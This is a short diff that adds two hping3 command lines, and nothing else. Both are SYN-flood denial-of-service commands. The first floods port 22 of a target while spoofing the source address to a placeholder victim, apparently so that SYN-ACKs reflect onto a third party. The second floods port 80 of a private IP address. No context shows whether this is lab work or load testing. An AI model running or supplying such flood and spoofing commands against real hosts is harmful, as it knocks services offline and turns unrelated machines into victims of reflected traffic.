@@ -1,0 +1,2 @@
+sudo hping3 -V -p 22 -S --flood -a <synackreceiverIP> <targetIP>
+sudo hping3 -S --flood -p 80 10.20.2.60
